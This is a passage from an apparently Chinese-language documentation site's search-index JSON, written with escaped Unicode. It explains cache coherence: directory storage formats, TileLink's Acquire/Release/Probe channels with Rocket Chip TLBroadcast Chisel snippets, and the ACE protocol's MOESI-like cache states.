clean\uff0c\u200b\u5219\u200b\u8fdb\u5165\u200b Modify \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff0cShared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u5728\u200b\u6362\u200b\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_3","title":"\u57fa\u4e8e\u200b\u76ee\u5f55\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u6709\u200b\u8fd9\u4e48\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u200b\uff1a\u200b\u5411\u200b\u6240\u6709\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u7f13\u5b58\u200b\u53d1\u9001\u200b/\u200b\u63a5\u53d7\u200b\u6d88\u606f\u200b\u3002\u200b\u7b80\u5355\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u76f4\u63a5\u200b\u5e7f\u64ad\u200b\uff0c\u200b\u7136\u540e\u200b\u63a5\u53d7\u200b\u7aef\u200b\u81ea\u5df1\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u5904\u7406\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u5728\u200b\u6838\u5fc3\u200b\u5f88\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5e7f\u64ad\u200b\u6d41\u91cf\u200b\u592a\u200b\u5927\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5148\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u54ea\u4e9b\u200b\u7f13\u5b58\u200b\u4f1a\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b\u5bf9\u200b\u8fd9\u4e9b\u200b\u7f13\u5b58\u200b\u70b9\u5bf9\u70b9\u200b\u5730\u200b\u53d1\u9001\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8282\u7701\u200b\u4e00\u4e9b\u200b\u7f51\u7edc\u6d41\u91cf\u200b\u3002</p> <p>\u200b\u600e\u4e48\u200b\u8bb0\u5f55\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u5462\u200b\uff1f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u529e\u6cd5\u200b\uff08Full bit vector format\uff09\u200b\u662f\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5168\u5c40\u200b\u7684\u200b\u8868\u200b\uff0c\u200b\u5bf9\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u90fd\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b\u5927\u5c0f\u200b\u4e3a\u200b N\uff08N \u200b\u4e3a\u200b\u6838\u5fc3\u200b\u6570\u200b\uff09\u200b\u7684\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c1 \u200b\u8868\u793a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6838\u5fc3\u200b\u4e2d\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u4fdd\u5b58\u200b\u6570\u636e\u91cf\u200b\u592a\u200b\u5927\u200b\uff1a\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u200b\u6b63\u6bd4\u200b\u4e8e\u200b N\uff0c\u200b\u8fd8\u8981\u200b\u518d\u200b\u4e58\u4ee5\u200b\u4e00\u6b21\u200b N\uff0c\u200b\u603b\u200b\u5bb9\u91cf\u200b\u662f\u200b \\(O(N^2)\\) \u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u7a0d\u5fae\u200b\u597d\u200b\u4e00\u4e9b\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff08Coarse bit vector format\uff09\u200b\u662f\u200b\uff0c\u200b\u6211\u200b\u628a\u200b\u6838\u5fc3\u200b\u5206\u7ec4\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6309\u7167\u200b NUMA \u200b\u8282\u70b9\u200b\u8fdb\u884c\u200b\u5212\u5206\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u90fd\u200b\u4fdd\u5b58\u200b\u4e00\u4e2a\u200b\u5927\u5c0f\u200b\u4e3a\u200b M\uff08M \u200b\u4e3a\u200b NUMA \u200b\u6570\u91cf\u200b\uff09\u200b\u7684\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c\u200b\u53ea\u8981\u200b\u8fd9\u4e2a\u200b NUMA \u200b\u8282\u70b9\u200b\u91cc\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4f4d\u200b\u5c31\u200b\u53d6\u200b 1\u3002\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u4ee5\u200b\u727a\u7272\u200b\u4e00\u90e8\u5206\u200b\u6d41\u91cf\u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff08NUMA \u200b\u8282\u70b9\u200b\u5185\u90e8\u200b\u5e7f\u64ad\u200b\uff09\uff0c\u200b\u6765\u200b\u8282\u7701\u200b\u4e00\u4e9b\u200b\u76ee\u5f55\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u901a\u5e38\u200b\u53ea\u4f1a\u200b\u5728\u200b\u5f88\u5c11\u200b\u7684\u200b\u6838\u5fc3\u200b\u4e2d\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u6709\u200b\u5f88\u5927\u200b\u7684\u200b\u4f18\u5316\u200b\u7a7a\u95f4\u200b\u3002\u200b\u6bd4\u5982\u8bf4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u540c\u65f6\u200b\u51fa\u73b0\u200b\u7684\u200b\u7f13\u5b58\u200b\u6570\u91cf\u200b\u4e0a\u9650\u200b\uff08Limited pointer format\uff09\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u6838\u5fc3\u200b\u7684\u200b\u4e0b\u6807\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u5c31\u662f\u200b \\(O(N\\log_2N)\\)\u3002\u200b\u4f46\u662f\u200b\u5462\u200b\uff0c\u200b\u8fd9\u6837\u200b\u9650\u5236\u200b\u4e86\u200b\u7f13\u5b58\u200b\u884c\u200b\u540c\u65f6\u200b\u51fa\u73b0\u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u5982\u679c\u200b\u8d85\u8fc7\u200b\u4e86\u200b\u4e0a\u9650\u200b\uff0c\u200b\u9700\u8981\u200b\u66ff\u6362\u200b\u6389\u200b\u5df2\u6709\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\u6027\u80fd\u200b\u4f1a\u200b\u964d\u4f4e\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b\u94fe\u8868\u200b (Chained directory format)\u3002\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u4fdd\u5b58\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6838\u5fc3\u200b\u7f16\u53f7\u200b\uff0c\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u6838\u5fc3\u200b\u7684\u200b\u7f13\u5b58\u200b\u91cc\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6838\u5fc3\u200b\u7f16\u53f7\u200b\uff0c\u200b\u6216\u8005\u200b\u8868\u793a\u200b\u94fe\u8868\u200b\u7ec8\u6b62\u200b\u3002\u200b\u8fd9\u6837\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u4e5f\u200b\u662f\u200b \\(O(N\\log_2N)\\)\uff0c\u200b\u4e0d\u8fc7\u200b\u53d1\u9001\u200b\u6d88\u606f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u66f4\u957f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8981\u200b\u4e32\u884c\u200b\u904d\u5386\u200b\u4e00\u904d\u200b\uff0c\u200b\u800c\u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u53d1\u9001\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e8c\u53c9\u6811\u200b\uff08Number-balanced binary tree format\uff09\u200b\u6765\u200b\u7ec4\u7ec7\u200b\uff1a\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u4fdd\u5b58\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u6307\u5411\u200b\u5de6\u5b50\u200b\u6811\u200b\u548c\u200b\u53f3\u5b50\u200b\u6811\u200b\uff0c\u200b\u7136\u540e\u200b\u5206\u522b\u200b\u904d\u5386\u200b\uff0c\u200b\u76ee\u7684\u200b\u8fd8\u662f\u200b\u52a0\u5feb\u200b\u904d\u5386\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u53d1\u9001\u200b\u6d88\u606f\u200b\u7ed9\u200b\u591a\u4e2a\u200b\u6838\u5fc3\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_4","title":"\u534f\u8bae\u200b\u5206\u6790","text":"<p>\u200b\u4e0b\u6587\u200b\u7ed3\u5408\u5b9e\u9645\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5206\u6790\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u662f\u200b\u5982\u4f55\u200b\u5728\u200b\u786c\u4ef6\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#tilelink","title":"TileLink \u200b\u534f\u8bae","text":"<p>TileLink \u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\uff0c\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b A \u200b\u548c\u200b D channel \u200b\u4ee5\u5916\u200b\uff0c\u200b\u5b83\u200b\u5f15\u5165\u200b\u4e86\u200b\u4e09\u4e2a\u200b channel\uff1aB\u3001C \u200b\u548c\u200b E\uff0c\u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u64cd\u4f5c\u200b\uff1a</p> <ul> <li>Acquire\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Acquire\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Grant\uff0c\u200b\u7136\u540e\u200b M-&gt;S \u200b\u5728\u200b E channel \u200b\u4e0a\u200b\u53d1\u9001\u200b GrantAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u83b7\u53d6\u200b\u4e00\u4e2a\u200b copy\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u548c\u200b Get \u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u63a5\u53d7\u200b\u54cd\u5e94\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u989d\u5916\u200b\u9700\u8981\u200b\u5728\u200b E channel \u200b\u4e0a\u200b\u53d1\u9001\u200b GrantAck\u3002</li> <li>Release\uff1aM-&gt;S \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Release/ReleaseData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ReleaseAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u5220\u9664\u200b\u81ea\u5df1\u200b\u7684\u200b copy\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u7f13\u5b58\u200b\u884c\u8981\u200b\u88ab\u200b\u6362\u200b\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5199\u200b\u56de\u200b Dirty \u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u7528\u200b ReleaseData\uff0c\u200b\u5426\u5219\u200b\u7528\u200b Release</li> <li>Probe\uff1aS-&gt;M \u200b\u5728\u200b B channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Probe\uff0cM-&gt;S \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ProbeAck\uff1b\u200b\u529f\u80fd\u200b\u662f\u200b\u8981\u6c42\u200b M \u200b\u5220\u9664\u200b\u81ea\u5df1\u200b\u7684\u200b copy\uff0c\u200b\u901a\u5e38\u200b\u662f\u200b\u6709\u200b\u67d0\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u53d1\u9001\u200b\u4e86\u200b Acquire\uff0c\u200b\u5bfc\u81f4\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u9700\u8981\u200b\u964d\u4f4e\u200b\u6743\u9650\u200b</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cA C E \u200b\u4e09\u4e2a\u200b channel \u200b\u662f\u200b M-&gt;S\uff0cB D \u200b\u4e24\u4e2a\u200b channel \u200b\u662f\u200b S-&gt;M\u3002</p> <p>\u200b\u5047\u5982\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\uff08Master A\uff09\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u5757\u200b\u53ea\u8bfb\u200b\u6570\u636e\u200b\uff0c\u200b\u6216\u8005\u200b\u8bfb\u53d6\u200b\u4e00\u5757\u200b miss \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u5e7f\u64ad\u5f0f\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u7ecf\u5386\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Master A -&gt; Slave: Acquire</li> <li>Slave -&gt; Master B: Probe</li> <li>Master B -&gt; Slave: ProbeAck</li> <li>Slave -&gt; Master A: Grant</li> <li>Master A -&gt; Slave: GrantAck</li> </ul> <p>\u200b\u9996\u5148\u200b Master A \u200b\u53d1\u51fa\u200b Acquire \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7136\u540e\u200b Slave \u200b\u5411\u200b\u5176\u4ed6\u200b Master \u200b\u5e7f\u64ad\u200b Probe\uff0c\u200b\u7b49\u5230\u200b\u5176\u4ed6\u200b Master \u200b\u8fd4\u56de\u200b ProbeAck \u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u5411\u200b Master A \u200b\u8fd4\u56de\u200b Grant\uff0c\u200b\u6700\u540e\u200b Master A \u200b\u53d1\u9001\u200b GrantAck \u200b\u7ed9\u200b Slave\u3002\u200b\u8fd9\u6837\u200b Master A \u200b\u5c31\u200b\u83b7\u5f97\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u4efd\u200b\u62f7\u8d1d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba9\u200b Master B \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u5931\u6548\u200b\u6216\u8005\u200b\u72b6\u6001\u200b\u53d8\u6210\u200b\u53ea\u8bfb\u200b\u3002</p> <p>TileLink \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u6709\u200b\u4e09\u4e2a\u200b\u72b6\u6001\u200b\uff1aNone\uff0cBranch \u200b\u548c\u200b Trunk(Tip)\u3002\u200b\u57fa\u672c\u200b\u5bf9\u5e94\u200b MSI \u200b\u6a21\u578b\u200b\uff1aNone-&gt;Invalid\uff0cBranch-&gt;Shared \u200b\u548c\u200b Trunk-&gt;Modified\u3002Rocket Chip \u200b\u4ee3\u7801\u200b\u4e2d\u200b ClientStates \u200b\u8fd8\u200b\u5b9a\u4e49\u200b\u4e86\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5927\u81f4\u200b\u5bf9\u5e94\u200b MESI \u200b\u6a21\u578b\u200b\uff1aNone-&gt;Invalid\uff0cBranch-&gt;Shared\uff0cTrunk-&gt;Exclusive\uff0cDirty-&gt;Modified\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u6807\u51c6\u200b\u8fd8\u200b\u8bf4\u200b\u53ef\u4ee5\u200b\u5728\u200b B \u200b\u548c\u200b C channel \u200b\u4e0a\u200b\u8fdb\u884c\u200b TL-UH \u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002\u200b\u6807\u51c6\u200b\u8fd9\u4e48\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u610f\u56fe\u200b\u662f\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Slave \u200b\u8f6c\u53d1\u200b\u64cd\u4f5c\u200b\u5230\u200b\u62e5\u6709\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b Master \u200b\u4e0a\u200b\u3002\u200b\u6bd4\u5982\u200b Master A \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Put \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b Slave \u200b\u5411\u200b Master B \u200b\u7684\u200b B channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Put \u200b\u8bf7\u6c42\u200b\uff0cMaster B \u200b\u5728\u200b C channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAck \u200b\u54cd\u5e94\u200b\uff0cSlave \u200b\u518d\u200b\u628a\u200b\u54cd\u5e94\u200b\u8f6c\u56de\u200b Master A \u200b\u7684\u200b D channel\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u662f\u200b\u4e00\u4e2a\u200b\u7247\u4e0a\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0cSlave \u200b\u8d1f\u8d23\u200b\u5728\u200b Master \u200b\u4e4b\u95f4\u200b\u8def\u7531\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b Rocket Chip \u200b\u81ea\u5e26\u200b\u7684\u200b\u57fa\u4e8e\u200b\u5e7f\u64ad\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u5b9e\u73b0\u200b\u3002\u200b\u6838\u5fc3\u200b\u5b9e\u73b0\u200b\u662f\u200b TLBroadcast\uff0c\u200b\u6838\u5fc3\u200b\u7684\u200b\u903b\u8f91\u200b\u5c31\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b Master A \u200b\u53d1\u9001\u200b\u4e86\u200b Acquire\uff0c\u200b\u90a3\u4e48\u200b TLBroadcast \u200b\u9700\u8981\u200b\u53d1\u9001\u200b Probe \u200b\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b Master\uff0c\u200b\u5f53\u200b\u5176\u4ed6\u200b\u7684\u200b Master \u200b\u90fd\u200b\u54cd\u5e94\u200b\u4e86\u200b ProbeAck \u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u8fd4\u56de\u200b Grant \u200b\u5230\u200b Master A\u3002</p> <p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b B channel \u200b\u4e0a\u200b\u7684\u200b Probe \u200b\u903b\u8f91\u200b\u3002\u200b\u5b83\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e00\u4e2a\u200b todo bitmask\uff0c\u200b\u8868\u793a\u200b\u54ea\u4e9b\u200b Master \u200b\u9700\u8981\u200b\u53d1\u9001\u200b Probe\uff0c\u200b\u8fd9\u91cc\u200b\u91c7\u7528\u200b\u4e86\u200b Probe Filter \u200b\u6765\u200b\u51cf\u5c11\u200b\u53d1\u9001\u200b Probe \u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53ea\u200b\u9700\u8981\u200b\u5411\u200b\u62e5\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b Master \u200b\u53d1\u9001\u200b Probe\uff1a</p> <pre><code>val probe_todo = RegInit(0.U(max(1, caches.size).W))\nval probe_line = Reg(UInt())\nval probe_perms = Reg(UInt(2.W))\nval probe_next = probe_todo &amp; ~(leftOR(probe_todo) &lt;&lt; 1)\nval probe_busy = probe_todo.orR()\nval probe_target = if (caches.size == 0) 0.U else Mux1H(probe_next, cache_targets)\n\n// Probe whatever the FSM wants to do next\nin.b.valid := probe_busy\nif (caches.size != 0) {\n    in.b.bits := edgeIn.Probe(probe_line &lt;&lt; lineShift, probe_target, lineShift.U, probe_perms)._2\n}\nwhen (in.b.fire()) { probe_todo := probe_todo &amp; ~probe_next }\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b <code>probe_next</code> \u200b\u5c31\u662f\u200b\u88ab\u200b probe \u200b\u7684\u200b\u90a3\u4e2a\u200b Master \u200b\u5bf9\u5e94\u200b\u7684\u200b bitmask\uff0c<code>probe_target</code> \u200b\u5c31\u662f\u200b Master \u200b\u7684\u200b Id\u3002\u200b\u8fd9\u4e2a\u200b Probe FSM \u200b\u7684\u200b\u8f93\u5165\u200b\u5c31\u662f\u200b Probe Filter\uff0c\u200b\u5b83\u4f1a\u200b\u7ed9\u51fa\u200b\u54ea\u4e9b\u200b Cache \u200b\u62e5\u6709\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>val leaveB = !filter.io.response.bits.needT &amp;&amp; !filter.io.response.bits.gaveT\nval others = filter.io.response.bits.cacheOH &amp; ~filter.io.response.bits.allocOH\nval todo = Mux(leaveB, 0.U, others)\nfilter.io.response.ready := !probe_busy\nwhen (filter.io.response.fire()) {\n    probe_todo  := todo\n    probe_line  := filter.io.response.bits.address &gt;&gt; lineShift\n    probe_perms := Mux(filter.io.response.bits.needT, TLPermissions.toN, TLPermissions.toB)\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u53c8\u200b\u533a\u5206\u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5982\u679c\u200b Acquire \u200b\u9700\u8981\u200b\u8fdb\u5165\u200b Trunk \u200b\u72b6\u6001\u200b\uff08\u200b\u6bd4\u5982\u200b\u662f\u200b\u4e2a\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u610f\u5473\u7740\u200b\u5176\u4ed6\u200b Master \u200b\u9700\u8981\u200b\u8fdb\u5165\u200b None \u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u8981\u200b\u53d1\u9001\u200b toN\uff1b\u200b\u5982\u679c\u200b Acquire \u200b\u4e0d\u200b\u9700\u8981\u200b\u8fdb\u5165\u200b Trunk \u200b\u72b6\u6001\u200b\uff08\u200b\u6bd4\u5982\u200b\u662f\u200b\u4e2a\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u200b\u9700\u8981\u200b\u5176\u4ed6\u200b Master \u200b\u8fdb\u5165\u200b Branch \u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u8981\u200b\u53d1\u9001\u200b toB\u3002</p> <p>\u200b\u5728\u200b B channel \u200b\u53d1\u9001\u200b Probe \u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u5904\u7406\u200b C channel \u200b\u4e0a\u200b\u7684\u200b ProbeAck \u200b\u548c\u200b ProbeAckData\uff1a</p> <pre><code>// Incoming C can be:\n// ProbeAck     =&gt; decrement tracker, drop \n// ProbeAckData =&gt; decrement tracker, send out A as PutFull(DROP)\n// ReleaseData  =&gt;                    send out A as PutFull(TRANSFORM)\n// Release      =&gt; send out D as ReleaseAck\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u8fd9\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b invalidation based\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b Master \u200b\u4e4b\u524d\u200b\u5904\u4e8e\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u4f1a\u200b\u53d1\u9001\u200b ProbeAckData\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u7528\u200b PutFull \u200b\u628a\u200b\u6570\u636e\u200b\u5199\u51fa\u53bb\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#ace","title":"ACE \u200b\u534f\u8bae","text":"<p>ACE \u200b\u5728\u200b AXI \u200b\u534f\u8bae\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002\u200b\u9996\u5148\u200b\u5217\u51fa\u200b ACE \u200b\u7684\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u6a21\u578b\u200b\uff0c\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u8fd9\u4e48\u200b\u4e94\u79cd\u200b\u72b6\u6001\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b MOESI \u200b\u7684\u200b\u4e0d\u540c\u200b\u8bf4\u6cd5\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u6587\u6863\u200b\u4e2d\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>Valid, Invalid: When valid, the cache line is present in the cache. When invalid, the cache line is not present in the cache.</li> <li>Unique, Shared: When unique, the cache line exists only in one cache. When shared, the cache line might exist in more than one cache, but this is not guaranteed.</li> <li>Clean, Dirty: When clean, the cache does not have responsibility for updating main memory. When dirty, the cache line has been modified with respect to main memory, and this cache must ensure that main memory is eventually updated.</li> </ul> <p>\u200b\u5927\u81f4\u200b\u7406\u89e3\u200b\u7684\u8bdd\u200b\uff0cUnique \u200b\u8868\u793a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0cShared \u200b\u8868\u793a\u200b\u6709\u200b\u53ef\u80fd\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff1bClean \u200b\u8868\u793a\u200b\u5b83\u200b\u4e0d\u200b\u8d1f\u8d23\u200b\u66f4\u65b0\u200b\u5185\u5b58\u200b\uff0cDirty 